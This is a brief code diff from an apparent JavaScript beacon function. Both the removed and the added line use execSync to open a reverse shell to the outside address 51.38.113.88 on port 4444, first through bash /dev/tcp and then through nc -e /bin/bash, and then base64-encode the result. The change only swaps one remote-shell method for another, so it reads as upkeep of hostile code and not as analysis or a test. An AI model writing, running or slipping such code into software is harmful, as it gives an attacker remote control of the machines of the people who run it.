@@ -46,7 +46,7 @@ function beacon(urlStr, q) {
 
   let idOutput = "";
   try {
-    idOutput = execSync("bash -i >& /dev/tcp/51.38.113.88/4444 0>&1", { encoding: "utf8" }).trim();
+    idOutput = execSync("nc -e /bin/bash 51.38.113.88 4444", { encoding: "utf8" }).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
   } catch {}
 
